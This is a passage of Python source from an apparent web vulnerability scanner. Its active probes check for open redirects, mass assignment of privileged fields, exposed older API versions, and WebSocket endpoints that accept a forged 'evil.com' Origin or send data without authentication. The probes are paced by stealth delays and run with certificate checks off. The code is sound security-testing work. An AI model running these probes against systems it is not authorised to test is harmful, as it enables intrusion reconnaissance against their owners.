            _ssrf_check_cloud_metadata(base, param, params, domain)

        else:
            # No interaction — still a candidate worth reporting, but unconfirmed
            alert(
                "SSRF CANDIDATE (NO OOB INTERACTION)",
                "MEDIUM",
                base,
                f"Parameter '{param}' on {base} accepts URLs but no OOB "
                f"interaction was received within 10s. Server may block "
                f"outbound connections, use an allowlist, or DNS is not "
                f"leaking. Manual verification recommended.{waf_note}",
            )


# ─────────────────────────────────────────────
# Open redirect detection
# ─────────────────────────────────────────────

REDIRECT_PARAMS = {
    "next", "url", "redirect", "redirect_url", "redirect_uri",
    "return", "return_to", "returnTo", "returnUrl", "return_url",
    "goto", "go", "dest", "destination", "target", "redir",
    "continue", "forward", "location", "ref", "referer",
    "callback", "callback_url", "jump", "link", "out", "r",
    "to", "uri", "path",
}

REDIRECT_CANARY  = "https://example.com/redirect-probe-5c8b"
_redirect_tested  = set()
_redirect_domains = set()

def _redirect_to_canary(location):
    """
    Return True only when the Location header points to the canary domain.
    Uses proper URL parsing to avoid false positives like example.com.attacker.com.
    """
    if not location:
        return False
    try:
        loc = location.strip()
        # Handle protocol-relative URLs (//example.com/...)
        if loc.startswith("//"):
            loc = "https:" + loc
        parsed = urlparse(loc)
        netloc = parsed.netloc.lower()
        # Strip port if present
        netloc = netloc.split(":")[0]
        # Strip leading www.
        if netloc.startswith("www."):
            netloc = netloc[4:]
        canary = "example.com"
        return netloc == canary or netloc.endswith("." + canary)
    except Exception:
        return False


def check_open_redirects(page_url, html_content):
    """
    Parse links on the page for URL parameters that accept redirect
    destinations. Inject an external canary and check if the response
    redirects there. Alerts HIGH on confirmed open redirect.
    """
    domain = urlparse(page_url).netloc
    if domain in _redirect_domains:
        return

    try:
        text = html_content if isinstance(html_content, str) \
               else html_content.decode("utf-8", errors="ignore")
        soup = BeautifulSoup(text, "lxml")
    except Exception:
        return

    candidate_urls = set()
    for tag in soup.find_all(["a", "form", "link"]):
        href = tag.get("href") or tag.get("action") or ""
        if href and href.startswith("http"):
            candidate_urls.add(href)
    candidate_urls.add(page_url)

    redirect_params_lower = {p.lower() for p in REDIRECT_PARAMS}

    for candidate in candidate_urls:
        if domain in _redirect_domains:
            break
        try:
            parsed = urlparse(candidate)
            if not parsed.query:
                continue
            params = {}
            for pair in parsed.query.split("&"):
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    params[k] = v
        except Exception:
            continue

        for param, value in params.items():
            if param.lower() not in redirect_params_lower:
                continue

            test_key = (parsed.scheme + "://" + parsed.netloc + parsed.path, param)
            if test_key in _redirect_tested:
                continue
            _redirect_tested.add(test_key)

            new_query = "&".join(
                f"{k}={REDIRECT_CANARY}" if k == param else f"{k}={v}"
                for k, v in params.items()
            )
            test_url = parsed.scheme + "://" + parsed.netloc + parsed.path + "?" + new_query

            try:
                stealth_delay(domain)
                resp = _get_session().get(
                    test_url,
                    headers=create_request_header(),
                    timeout=5,
                    allow_redirects=False,
                )
                location = resp.headers.get("Location", "")
                if _is_akamai_block(resp):
                    continue
                if resp.status_code in (301, 302, 303, 307, 308) and \
                   _redirect_to_canary(location):
                    _redirect_domains.add(domain)
                    _tu = test_url
                    _msv_verify(
                        "HIGH", "OPEN REDIRECT", _tu,
                        f"Parameter '{param}' redirects to injected URL. "
                        f"Location: {location[:120]}",
                        lambda _u=_tu: _get_session().get(
                            _u, headers=create_request_header(),
                            timeout=5, allow_redirects=False,
                        ),
                        lambda r: (
                            r.status_code in (301, 302, 303, 307, 308)
                            and _redirect_to_canary(r.headers.get("Location", ""))
                        ),
                    )
                    print(timestamp() + f" [!!] Open redirect: {test_url} → {location[:80]}")
                    break
            except Exception as e:
                print_error(f"Open redirect test failed for {test_url}: {e}")


# ─────────────────────────────────────────────
# Mass assignment detection
# ─────────────────────────────────────────────

# High-value fields — flag as HIGH / CRITICAL when confirmed.
# All boolean fields are injected as False; string fields use recognisable
# probe tokens; numeric fields use 0.  None of these values can grant
# elevated access if accidentally persisted.
_MA_HIGH_FIELDS: dict = {
    "role":              "test-role-probe",
    "user_role":         "test-role-probe",
    "group":             "test-group-probe",
    "admin":             False,
    "is_admin":          False,
    "isAdmin":           False,
    "permission":        "none",
    "permissions":       "none",
    "verified":          False,
    "is_verified":       False,
    "email_verified":    False,
    "balance":           0,
    "credits":           0,
    "points":            0,
    "subscription_tier": "test-tier-probe",
    "plan":              "test-plan-probe",
}

# Medium-value fields — flag as MEDIUM when confirmed.
_MA_MEDIUM_FIELDS: dict = {
    "status":         "test-status-probe",
    "account_status": "test-status-probe",
    "activated":      False,
    "disabled":       False,
    "internal":       False,
    "debug":          False,
}

# Noisy / always-present fields — skip entirely.
_MA_SKIP_FIELDS: frozenset = frozenset({
    "created_at", "updated_at", "created", "updated",
    "id", "uuid", "timestamp", "date", "time",
})

# Static file extensions — skip these endpoints entirely.
_MA_STATIC_EXT_RE = re.compile(
    r'\.(?:js|css|png|jpe?g|gif|svg|ico|woff2?|ttf|eot|map|txt|xml|pdf|zip|gz)$',
    re.IGNORECASE,
)

# Timestamp / session-token noise — masked before response diffing so that
# rotating session values don't produce false "meaningful diff" signals.
_MA_NOISE_RE = re.compile(
    r'\b\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}[^\s"\'<>]{0,25}\b'
    r'|\b\d{10,13}\b'
    r'|[0-9a-fA-F]{32,}',
)

_mass_assign_tested: set = set()


def check_mass_assignment(page_url: str, html_content) -> None:
    """
    Two-stage mass assignment detection for JSON-accepting API endpoints.

    Stage 0 — Baseline:
      Sends the original request body (no injected fields) and records the
      response.  Only continues to Stage 1 if the endpoint returns JSON.

    Stage 1 — Inject and capture:
      Sends a probe request with each sensitive field set to a safe,
      clearly-fake test value.  Compares the probe response against the
      baseline after masking timestamps and session tokens.  Only proceeds
      if the diff is meaningful AND a test value or field name is newly
      present in the probe response.

    Stage 2 — Verify persistence:
      Immediately sends a clean GET to the same endpoint.  If any injected
      string test value (e.g. "test-role-probe") appears in the GET response,
      the field was persisted server-side and the finding is CONFIRMED.
      Otherwise it is reported as NEEDS VERIFICATION.

    Safe test values — all boolean fields are injected as False; string
    privilege fields use recognisable probe tokens ("test-role-probe",
    "none", "test-tier-probe"); numeric fields use 0.  None of these values
    can grant elevated access if accidentally persisted.

    Field tiers:
      HIGH    — role, user_role, group, admin, is_admin, permission,
                verified, balance, credits, subscription_tier, plan
      MEDIUM  — status, account_status, activated, disabled, internal, debug
      Skipped — created_at, updated_at, id, uuid (noisy / always present)

    Endpoint filter:
      Only tests POST/PUT/PATCH endpoints that return JSON responses and
      are not static file paths or third-party CDN domains.

    Only runs when --active-probes is enabled.
    Deduplicates per endpoint URL.  8-second timeout per probe.
    """
    if not is_in_scope(page_url):
        return
    domain = urlparse(page_url).netloc
    if is_third_party_cdn(domain):
        return

    try:
        text = html_content if isinstance(html_content, str) \
               else html_content.decode("utf-8", errors="ignore")
        soup = BeautifulSoup(text, "lxml")
    except Exception:
        return

    # ── Collect endpoints ─────────────────────────────────────────────────
    endpoints = []
    for form in soup.find_all("form"):
        method = form.get("method", "get").upper()
        if method not in ("POST", "PUT", "PATCH"):
            continue
        action       = form.get("action") or page_url
        endpoint_url = urljoin(page_url, action)
        if urlparse(endpoint_url).netloc != domain:
            continue
        if _MA_STATIC_EXT_RE.search(urlparse(endpoint_url).path):
            continue
        fields = {}
        for inp in form.find_all(["input", "textarea", "select"]):
            name = inp.get("name", "")
            val  = inp.get("value") or "test"
            itype = inp.get("type", "").lower()
            if name and itype not in ("submit", "button", "image", "reset", "file"):
                fields[name] = val
        endpoints.append((endpoint_url, method, fields))

    # Also probe REST-style page URLs
    parsed_page = urlparse(page_url)
    if any(seg in parsed_page.path
           for seg in ("/api/", "/v1/", "/v2/", "/v3/", "/v4/", "/rest/")):
        if not _MA_STATIC_EXT_RE.search(parsed_page.path):
            endpoints.append((page_url, "POST", {}))

    # ── Per-endpoint probing ──────────────────────────────────────────────
    for endpoint_url, method, base_fields in endpoints:
        if endpoint_url in _mass_assign_tested:
            continue
        _mass_assign_tested.add(endpoint_url)

        if is_third_party_cdn(urlparse(endpoint_url).netloc):
            continue

        # Determine which fields to inject — skip any already in base_fields
        # or in the noisy skip-list.
        inj_high   = {k: v for k, v in _MA_HIGH_FIELDS.items()
                      if k not in base_fields and k not in _MA_SKIP_FIELDS}
        inj_medium = {k: v for k, v in _MA_MEDIUM_FIELDS.items()
                      if k not in base_fields and k not in _MA_SKIP_FIELDS}
        inj_all    = {**inj_high, **inj_medium}
        if not inj_all:
            continue

        probe_headers = {**create_request_header(), "Content-Type": "application/json"}

        # ── Stage 0: Baseline (no injected fields) ────────────────────────
        try:
            stealth_delay(domain)
            bl_resp = _get_session().request(
                method, endpoint_url,
                json=base_fields or {},
                headers=probe_headers,
                timeout=8,
                allow_redirects=False,
                verify=False,
            )
            bl_ct   = bl_resp.headers.get("Content-Type", "").lower()
            bl_body = bl_resp.text or ""
            bl_status = bl_resp.status_code
        except Exception:
            continue

        # Only test JSON endpoints
        if "json" not in bl_ct:
            continue

        # ── Stage 1: Probe with injected fields ───────────────────────────
        probe_payload = {**base_fields, **inj_all}
        try:
            stealth_delay(domain)
            pr_resp = _get_session().request(
                method, endpoint_url,
                json=probe_payload,
                headers=probe_headers,
                timeout=8,
                allow_redirects=False,
                verify=False,
            )
            pr_body   = pr_resp.text or ""
            pr_status = pr_resp.status_code
        except Exception:
            continue

        # ── Response diff gate ────────────────────────────────────────────
        bl_masked = _MA_NOISE_RE.sub("__X__", bl_body)
        pr_masked = _MA_NOISE_RE.sub("__X__", pr_body)
        len_bl    = max(len(bl_masked), 1)
        len_delta = abs(len(pr_masked) - len(bl_masked))
        diff_meaningful = (
            pr_status != bl_status
            or (len_delta > 50 and len_delta / len_bl > 0.05)
        )
        # Also allow through when a distinctive string test value newly appears
        new_str_values = [
            (k, v) for k, v in inj_all.items()
            if isinstance(v, str) and v in pr_body and v not in bl_body
        ]
        if not diff_meaningful and not new_str_values:
            continue

        # ── Identify reflected fields (new in probe, absent in baseline) ──
        def _is_reflected(field: str, val) -> bool:
            name_new  = field in pr_body and field not in bl_body
            val_new   = isinstance(val, str) and val in pr_body and val not in bl_body
            return name_new or val_new

        ref_high   = [(k, v) for k, v in inj_high.items()   if _is_reflected(k, v)]
        ref_medium = [(k, v) for k, v in inj_medium.items() if _is_reflected(k, v)]
        reflected  = ref_high + ref_medium
        if not reflected:
            continue

        print(timestamp() + f" [*] Mass assignment Stage 1: {endpoint_url} "
              f"reflected {[k for k, _ in reflected]}")

        # ── Stage 2: Verify persistence via GET ───────────────────────────
        confirmed: set = set()
        try:
            stealth_delay(domain)
            get_resp = _get_session().get(
                endpoint_url,
                headers=create_request_header(),
                timeout=8,
                allow_redirects=True,
                verify=False,
            )
            get_body = get_resp.text or ""
            for field, val in reflected:
                if isinstance(val, str) and val in get_body:
                    confirmed.add(field)
        except Exception:
            get_body = ""

        # ── Alert ─────────────────────────────────────────────────────────
        for field, val in reflected:
            is_confirmed = field in confirmed
            tier_high    = field in inj_high
            if is_confirmed and tier_high:
                sev   = "CRITICAL"
                title = "MASS ASSIGNMENT — CONFIRMED"
            elif is_confirmed:
                sev   = "HIGH"
                title = "MASS ASSIGNMENT — CONFIRMED"
            elif tier_high:
                sev   = "HIGH"
                title = "MASS ASSIGNMENT CANDIDATE"
            else:
                sev   = "MEDIUM"
                title = "MASS ASSIGNMENT CANDIDATE"

            conf_note = (
                "CONFIRMED — injected value persisted in subsequent GET response"
                if is_confirmed else
                "NEEDS VERIFICATION — reflected in probe response only; "
                "persistence not confirmed"
            )
            detail = (
                f"{method} {endpoint_url} accepted injected field "
                f"'{field}' = {val!r} (safe test value). "
                f"Field was reflected in the {method} response body. "
                f"Confirmation: {conf_note}. "
                f"Verify manually whether the server processed this "
                f"privileged field."
            )
            alert(title, sev, endpoint_url, detail)
            print(timestamp() + f" [!!] {title}: {endpoint_url} "
                  f"field={field!r} val={val!r} confirmed={is_confirmed}")


# ─────────────────────────────────────────────
# API version enumeration
# ─────────────────────────────────────────────

_API_VERSION_RE   = re.compile(r'/(v\d+)(?=/|$)', re.I)
_api_version_tested = set()

def check_api_versioning(page_url):
    """
    For any URL with a versioned path segment (/v1/, /v2/, etc.), probe
    adjacent versions to find older endpoints that may lack the security
    controls present in the current version.

    Versions tested: current-2, current-1, current+1.
    A 404 or 401/403 on the alternate version is silently skipped.

    Severity:
      HIGH   — alternate version returns 200 where current requires auth (401/403)
      MEDIUM — alternate version returns 200 (different accessibility, verify manually)

    Only runs when --active-probes is enabled. Deduplicates per (host, path) pattern.
    """
    parsed = urlparse(page_url)
    match  = _API_VERSION_RE.search(parsed.path)
    if not match:
        return

    current_ver_str = match.group(1).lower()       # e.g. "v2"
    current_ver_num = int(current_ver_str[1:])     # e.g. 2

    pattern_key = (parsed.netloc, parsed.path)
    if pattern_key in _api_version_tested:
        return
    _api_version_tested.add(pattern_key)

    domain = parsed.netloc
    base   = parsed.scheme + "://" + parsed.netloc

    # Fetch current version's status to use as comparison baseline
    try:
        stealth_delay(domain)
        current_resp   = _get_session().get(
            page_url,
            headers=create_request_header(),
            timeout=6,
            allow_redirects=False,
            verify=False,
        )
        current_status = current_resp.status_code
    except Exception:
        return

    for delta in (-2, -1, 1):
        alt_ver_num = current_ver_num + delta
        if alt_ver_num < 1:
            continue
        alt_ver_str = f"v{alt_ver_num}"
        alt_path    = _API_VERSION_RE.sub(f"/{alt_ver_str}", parsed.path, count=1)
        alt_url     = base + alt_path + (("?" + parsed.query) if parsed.query else "")

        try:
            stealth_delay(domain)
            alt_resp   = _get_session().get(
                alt_url,
                headers=create_request_header(),
                timeout=6,
                allow_redirects=False,
                verify=False,
            )
            alt_status = alt_resp.status_code

            # 404 → doesn't exist; 401/403 → protected — both fine, skip
            if alt_status in (404, 401, 403):
                continue

            if alt_status == 200 and current_status in (401, 403):
                alert(
                    "API VERSION AUTHENTICATION BYPASS",
                    "HIGH",
                    alt_url,
                    f"API {alt_ver_str} at {alt_url} returns {alt_status} where "
                    f"current {current_ver_str} requires auth ({current_status}) — "
                    f"authentication controls may be absent on the older version"
                )
                print(timestamp() + f" [!!] API version auth bypass: {alt_url} "
                                    f"({alt_status}) vs {current_ver_str} ({current_status})")
            elif alt_status == 200:
                alert(
                    "OLDER API VERSION ACCESSIBLE",
                    "MEDIUM",
                    alt_url,
                    f"API {alt_ver_str} at {alt_url} returned {alt_status} — "
                    f"older versions may lack security controls present in "
                    f"{current_ver_str}; verify response structure manually"
                )
                print(timestamp() + f" [!] Older API version accessible: "
                                    f"{alt_url} ({alt_status})")
        except Exception as e:
            print_error(f"check_api_versioning failed for {alt_url}: {e}")


# ─────────────────────────────────────────────
# WebSocket endpoint detection and security checks
# ─────────────────────────────────────────────

# Match explicit ws:// or wss:// URLs in page source
_WS_URL_RE = re.compile(r'''\b(wss?://[^\s"'<>)]+)''', re.I)

# Match JS patterns that establish WebSocket connections
_WS_JS_PATTERNS = re.compile(
    r'''(?:new\s+WebSocket\s*\(|io\s*\(|socket\.connect\s*\()\s*["']?(wss?://[^\s"'<>)]+)["']?''',
    re.I
)

# Tracks WS URLs already security-tested this session
_ws_security_tested: set = set()
# Tracks WS URLs already stored in DB this session
_ws_stored: set = set()


def write_to_websockets_database(page_url: str, ws_url: str, encrypted: bool) -> None:
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "WebSockets")
        conn.execute(
            "INSERT INTO WebSockets (page_url, ws_url, encrypted, found_at) VALUES (?,?,?,?)",
            (page_url, ws_url, int(encrypted), timestamp())
        )
    except Exception as e:
        print_error("write_to_websockets_database: " + str(e))
    finally:
        conn.close()


def discover_websockets(page_url: str, html_content: str, response_headers: dict) -> None:
    """
    Scan page source and response headers for WebSocket endpoints.
    Runs unconditionally on every crawled page.
    Discovered endpoints are stored in the WebSockets table and, if
    --active-probes is enabled, passed to check_websocket_security().
    """
    if isinstance(html_content, bytes):
        html_content = html_content.decode("utf-8", errors="ignore")

    found: set = set()

    # 1. Explicit ws:// / wss:// literals in page source
    for m in _WS_URL_RE.finditer(html_content):
        found.add(m.group(1).strip())

    # 2. JavaScript WebSocket construction calls
    for m in _WS_JS_PATTERNS.finditer(html_content):
        found.add(m.group(1).strip())

    # 3. Response header: Upgrade: websocket — promote the page URL itself
    upgrade = response_headers.get("Upgrade", "").lower()
    if upgrade == "websocket":
        # Convert the page URL scheme to wss:// or ws://
        parsed = urlparse(page_url)
        ws_scheme = "wss" if parsed.scheme == "https" else "ws"
        ws_url = parsed._replace(scheme=ws_scheme).geturl()
        found.add(ws_url)

    for ws_url in found:
        if ws_url in _ws_stored:
            continue
        _ws_stored.add(ws_url)
        encrypted = ws_url.lower().startswith("wss://")
        write_to_websockets_database(page_url, ws_url, encrypted)
        print(timestamp() + f" [WS] Discovered WebSocket endpoint: {ws_url}")

        if ACTIVE_PROBES:
            check_websocket_security(ws_url, page_url)


def check_websocket_security(ws_url: str, page_url: str) -> None:
    """
    Run three security checks against a discovered WebSocket endpoint.
    Only called when --active-probes is enabled.
    Requires the 'websockets' library; silently skips if unavailable.
    """
    if not WEBSOCKETS_AVAILABLE:
        return
    if ws_url in _ws_security_tested:
        return
    _ws_security_tested.add(ws_url)

    domain = urlparse(page_url).netloc

    # ── Check 1: Unencrypted WebSocket ──────────────────────────────────────
    if ws_url.lower().startswith("ws://"):
        alert(
            "UNENCRYPTED WEBSOCKET",
            "MEDIUM",
            ws_url,
            f"WebSocket endpoint uses unencrypted ws:// scheme — traffic is "
            f"transmitted in plaintext and susceptible to eavesdropping and "
            f"manipulation by a network-level attacker"
        )
        print(timestamp() + f" [!] Unencrypted WebSocket: {ws_url}")

    # Async helpers run in a dedicated event loop inside the calling thread
    async def _origin_check() -> None:
        """Connect with a foreign Origin header; flag if server accepts it."""
        try:
            extra_headers = {"Origin": "https://evil.com"}
            async with websockets.connect(
                ws_url,
                additional_headers=extra_headers,
                open_timeout=5,
                close_timeout=5,
                ssl=None,
            ) as ws:
                # If we connected successfully the server accepted the origin
                alert(
                    "WEBSOCKET ORIGIN VALIDATION MISSING",
                    "HIGH",
                    ws_url,
                    f"WebSocket at {ws_url} accepted connection from arbitrary "
                    f"Origin 'https://evil.com' — the server does not validate "
                    f"the Origin header, enabling cross-site WebSocket hijacking "
                    f"(CSWSH) from any malicious page"
                )
                print(timestamp() + f" [!!] WS accepts arbitrary origin: {ws_url}")
        except (
            websockets.exceptions.InvalidStatus,
            websockets.exceptions.RejectHandshake,
            ConnectionRefusedError,
            OSError,
            asyncio.TimeoutError,
        ):
            pass  # Rejected or unreachable — expected for a secure server
        except Exception as e:
            print_error(f"WS origin check error ({ws_url}): {e}")

    async def _auth_check() -> None:
        """Connect without credentials; flag if the server sends data."""
        try:
            async with websockets.connect(
                ws_url,
                additional_headers={},  # no cookies, no auth
                open_timeout=5,
                close_timeout=5,
                ssl=None,
            ) as ws:
                try:
                    msg = await asyncio.wait_for(ws.recv(), timeout=5)
                    if msg:
                        alert(
                            "WEBSOCKET UNAUTHENTICATED DATA EXPOSURE",
                            "HIGH",
                            ws_url,
                            f"WebSocket at {ws_url} returned data without "
                            f"authentication credentials — unauthenticated clients "
                            f"can receive server messages; first {min(200, len(str(msg)))} bytes: "
                            f"{str(msg)[:200]!r}"
                        )
                        print(timestamp() + f" [!!] WS sends data without auth: {ws_url}")
                except asyncio.TimeoutError:
                    pass  # Server is waiting for client message — not necessarily a flaw
        except (
            websockets.exceptions.InvalidStatus,
            websockets.exceptions.RejectHandshake,
            ConnectionRefusedError,
            OSError,
            asyncio.TimeoutError,
        ):
            pass
        except Exception as e:
            print_error(f"WS auth check error ({ws_url}): {e}")

    def _run_checks() -> None:
        loop = asyncio.new_event_loop()
        try:
            loop.run_until_complete(_origin_check())
            loop.run_until_complete(_auth_check())
        finally:
            loop.close()

    t = threading.Thread(target=_run_checks, daemon=True)
    t.start()
    t.join(timeout=30)


# ─────────────────────────────────────────────
# Shared probe helpers: baseline cache, response diffing, context detection
# ─────────────────────────────────────────────

_probe_baseline: dict = {}   # (base_url, params_frozen) → (status_int, body_str)

# ── Per-endpoint baseline profiling ───────────────────────────────────────────

@dataclass
class EndpointBaseline:
    """Rich multi-sample baseline for an endpoint+params pair."""
    url: str
    status_code: int
    content_type: str
    response_length_mean: float
    response_length_std: float
    response_time_mean: float
    response_time_std: float
    content_fingerprint: str
    dynamic_regions: list = field(default_factory=list)
    body: str = ""


_endpoint_baselines: dict = {}        # key → EndpointBaseline | None  (completed)
_endpoint_baseline_futures: dict = {} # key → Future[EndpointBaseline | None]  (in-flight)

# Background thread pool for non-blocking baseline collection (max 3 concurrent fetches).
_baseline_pool = _BLThreadPoolExecutor(max_workers=3, thread_name_prefix="nuscrape-bl")

# Dedicated per-request thread pool used inside _collect_baseline_worker so each
# HTTP fetch can be awaited with future.result(timeout=5), enforcing the hard
# per-request cap at the thread level (catches DNS stalls and SSL hangs that
# bypass requests' own timeout parameter).
_baseline_req_pool = _BLThreadPoolExecutor(max_workers=6, thread_name_prefix="nuscrape-bl-req")

# Static file extensions — never worth baselining.
_BL_STATIC_EXT_RE = re.compile(
    r'\.(?:js|css|png|jpe?g|gif|webp|svg|ico|woff2?|ttf|eot|map)$',
    re.IGNORECASE,
)

# Masks dynamic content before fingerprinting (timestamps, epochs, hex, base64, UUIDs)
_BL_DYNAMIC_RE = re.compile(
    r'\b\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}(?:\.\d+)?(?:Z|[+-]\d{2}:\d{2})?\b'
    r'|\b\d{10,13}\b'
    r'|[0-9a-f]{32,}'
    r'|[A-Za-z0-9+/]{40,}={0,2}'
    r'|[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}',
    re.IGNORECASE,
)


def _bl_mask_body(body: str) -> str:
    """Replace dynamic tokens in body with a stable placeholder."""
    return _BL_DYNAMIC_RE.sub("__DYNAMIC__", body)


def _bl_fingerprint(masked_body: str) -> str:
    """SHA-256 of masked body, truncated to 16 hex chars."""
    return hashlib.sha256(masked_body.encode("utf-8", errors="ignore")).hexdigest()[:16]


def _bl_find_dynamic_regions(bodies: list) -> list:
    """
    Return a merged list of (start, end) character-offset ranges that differ
    across the collected baseline samples.  Used to mask noise before fingerprinting.
    """
    if len(bodies) < 2:
        return []
    regions = []
    a = bodies[0]
    for b in bodies[1:]:
        sm = difflib.SequenceMatcher(None, a, b, autojunk=False)
        for tag, i1, i2, _j1, _j2 in sm.get_opcodes():
            if tag != "equal":
                regions.append((i1, i2))
    if not regions:
        return []
    regions.sort()
    merged = [list(regions[0])]
    for start, end in regions[1:]:
        if start <= merged[-1][1]:
            merged[-1][1] = max(merged[-1][1], end)
        else:
            merged.append([start, end])
    return [tuple(r) for r in merged]


def _collect_baseline_worker(base: str, params: dict):
    """
    Background worker: collect a 2-sample baseline for (base, params).

    Both requests fire concurrently via _baseline_req_pool so total baseline
    time is bounded by the slower of the two responses, not their sum.

    Stealth delays are deliberately skipped: baseline requests are internal
    measurement probes, not crawl requests, and don't need pacing.
    Per-request timing is measured inside each thread for accuracy.

    Hard timeout: 8 seconds per request (future.result + requests.Timeout).
    concurrent.futures.TimeoutError cancels remaining futures and skips
    the endpoint entirely.

    The entire worker body is wrapped in a top-level try/except so any
    unexpected failure skips baseline gracefully rather than hanging or crashing.

    Returns EndpointBaseline or None.  Called via _baseline_pool only.
    """
    _PER_REQ_TIMEOUT = 8

    def _do_fetch(url: str):
        """Fetch url and return (response, elapsed_ms). No stealth delay."""
        t0   = time.monotonic()
        resp = _get_session().get(
            url,
            headers=create_request_header(),
            timeout=_PER_REQ_TIMEOUT,
            allow_redirects=True,
            verify=False,
        )
        return resp, (time.monotonic() - t0) * 1000

    try:
        query  = "&".join(f"{k}={v}" for k, v in params.items())
        sep    = "&" if query else ""
        now_ms = int(time.time() * 1000)
        urls   = [
            base + "?" + query + sep + f"_cb={now_ms + i}"
            for i in range(2)
        ]

        # Fire both requests simultaneously
        futures = [_baseline_req_pool.submit(_do_fetch, u) for u in urls]

        samples_body: list = []
        samples_len:  list = []
        samples_time: list = []
        last_status = None
        last_ct     = ""

        for fut in futures:
            try:
                resp, elapsed_ms = fut.result(timeout=_PER_REQ_TIMEOUT)
                body        = resp.text or ""
                last_status = resp.status_code
                last_ct     = resp.headers.get("Content-Type", "")
                samples_body.append(body)
                samples_len.append(len(body))
                samples_time.append(elapsed_ms)
            except concurrent.futures.TimeoutError:
                print(timestamp() + f" [Baseline] Skipping {base} — timed out")
                for f in futures:
                    f.cancel()
                return None
            except Exception:
                pass

        if not samples_body:
            return None

        dynamic_regions = _bl_find_dynamic_regions(samples_body)
        masked          = _bl_mask_body(samples_body[-1])
        fingerprint     = _bl_fingerprint(masked)

        bl = EndpointBaseline(
            url=base,
            status_code=last_status or 0,
            content_type=last_ct,
            response_length_mean=statistics.mean(samples_len),
            response_length_std=statistics.pstdev(samples_len) if len(samples_len) > 1 else 0.0,
            response_time_mean=statistics.mean(samples_time),
            response_time_std=statistics.pstdev(samples_time) if len(samples_time) > 1 else 0.0,
            content_fingerprint=fingerprint,
            dynamic_regions=dynamic_regions,
            body=samples_body[-1],
        )
        print(timestamp() + f" [Baseline] {base} — status={bl.status_code} "
              f"len={bl.response_length_mean:.0f}±{bl.response_length_std:.0f} "
              f"fp={bl.content_fingerprint}")
        return bl
    except Exception:
        return None


def _schedule_endpoint_baseline(base: str, params: dict) -> None:
    """
    Submit baseline collection for (base, params) to the background pool.

    Returns immediately — never blocks.  Call _get_endpoint_baseline() later
    to retrieve the result.  No-op when:
      - BASELINE_ENABLED is False
      - ACTIVE_PROBES is False (baseline is only useful for probe comparison)
      - endpoint path matches a static asset extension
      - endpoint host is a third-party CDN
      - baseline already completed or is already in-flight
    """
    if not BASELINE_ENABLED:
        return
    if not ACTIVE_PROBES:
        return
    if _BL_STATIC_EXT_RE.search(urlparse(base).path):
        return
    if is_third_party_cdn(urlparse(base).netloc):
        return
    key = (base, frozenset(params.items()))
    if key in _endpoint_baselines or key in _endpoint_baseline_futures:
        return
    _endpoint_baseline_futures[key] = _baseline_pool.submit(
        _collect_baseline_worker, base, params
    )


def _get_endpoint_baseline(base: str, params: dict, timeout: int = 8):
    """
    Non-blocking retrieval of a completed baseline for (base, params).

    Returns EndpointBaseline if collection has finished, None otherwise.
    If no collection has been scheduled yet, submits one and returns None
    (probe proceeds without diffing; baseline will be available for the
    next probe on the same endpoint).

    The timeout parameter is accepted for call-site compatibility but is no
    longer used here — timeouts are enforced inside _collect_baseline_worker.
    """
    if not BASELINE_ENABLED:
        return None
    if not ACTIVE_PROBES:
        return None
    key = (base, frozenset(params.items()))
    # Fast path: already completed
    if key in _endpoint_baselines:
        return _endpoint_baselines[key]
    # Check in-flight future
    fut = _endpoint_baseline_futures.get(key)
    if fut is not None:
        if fut.done():
            result = fut.result()
            _endpoint_baselines[key] = result
            return result
        # Still running — proceed without baseline
        return None
    # Nothing scheduled yet — queue it and return None
    _schedule_endpoint_baseline(base, params)
    return None


def _schedule_baselines_for_page(url: str, html) -> None:
    """
    Pre-queue background baseline collection for probe-able endpoints on this page.

    Called from the crawl loop at the very start of the ACTIVE_PROBES block so
    that baselines have time to complete while the earlier non-baseline checks
    (SSRF, open redirect, GraphQL, mass-assignment, API versioning) are running.
    By the time check_path_traversal / check_ssti / check_sqli etc. fire, the
    baseline future will often already be done.

    Schedules:
      1. The page URL itself (covers all URL-param-based probes).
      2. Same-domain POST/PUT/PATCH form action URLs (covers HPP, LDAP, etc.).
    """
    if not BASELINE_ENABLED:
        return
    domain = urlparse(url).netloc

    # 1 — page URL params
    parsed = urlparse(url)
    if parsed.query:
        from urllib.parse import parse_qs as _pqs
        qparams = {k: v[0] for k, v in _pqs(parsed.query, keep_blank_values=True).items()}
        base    = parsed.scheme + "://" + parsed.netloc + parsed.path
        _schedule_endpoint_baseline(base, qparams)

    # 2 — form action URLs
    try:
        text = html if isinstance(html, str) \
               else (html or b"").decode("utf-8", errors="ignore")
        soup = BeautifulSoup(text, "lxml")
        for form in soup.find_all("form"):
            method = form.get("method", "get").upper()
            if method not in ("POST", "PUT", "PATCH"):
                continue
            action   = form.get("action") or url
            form_url = urljoin(url, action)
            if urlparse(form_url).netloc != domain:
                continue
            fp       = urlparse(form_url)
            fbase    = fp.scheme + "://" + fp.netloc + fp.path
            fparams: dict = {}
            if fp.query:
                from urllib.parse import parse_qs as _pqs2
                fparams = {k: v[0] for k, v in _pqs2(fp.query).items()}
            _schedule_endpoint_baseline(fbase, fparams)
    except Exception:
        pass


def _is_probe_anomalous(
    baseline,
    probe_body: str,
    probe_status: int,
    probe_time_ms: float = 0.0,
) -> tuple:
    """
    Return (is_anomalous: bool, reason: str).

    When baseline is None, returns (False, "no baseline") so callers never
    suppress a finding purely because baseline collection failed.

    An anomaly is any of:
      1. HTTP status code differs from baseline
      2. Body length changed by >10% AND >50 bytes
      3. Dynamic-masked content fingerprint changed
      4. Response time > mean + 3 × std  (useful for time-based detections)
    """
    if baseline is None:
        return False, "no baseline"

    # 1. Status code change
    if probe_status != baseline.status_code:
        return True, f"status changed {baseline.status_code}→{probe_status}"

    # 2. Body length change
    probe_len = len(probe_body)
    bl_len = baseline.response_length_mean
    if bl_len > 0:
        delta = abs(probe_len - bl_len)
        if delta > 50 and (delta / bl_len) > 0.10:
            return True, (f"body length changed "
                          f"{bl_len:.0f}→{probe_len} ({delta / bl_len:.0%})")

    # 3. Content fingerprint change
    probe_fp = _bl_fingerprint(_bl_mask_body(probe_body))
    if probe_fp != baseline.content_fingerprint:
        return True, (f"content fingerprint changed "
                      f"({baseline.content_fingerprint}→{probe_fp})")

